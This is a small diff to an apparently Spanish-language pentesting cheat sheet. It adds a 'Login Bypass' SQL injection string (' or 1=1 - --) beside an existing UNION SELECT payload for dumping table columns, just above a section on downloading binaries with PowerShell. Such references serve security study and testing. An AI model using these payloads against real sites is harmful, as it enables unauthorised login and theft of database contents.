@@ -68,6 +68,11 @@ Table dumping
 ```
 UNION SELECT 1,2,group_concat(columna1,':',columna2 SEPARATOR '<br>') FROM nombre_tabla
 ```
+### Login Bypass
+
+```
+' or 1=1 - --
+```
 # Powershell
 
 Descargar binarios
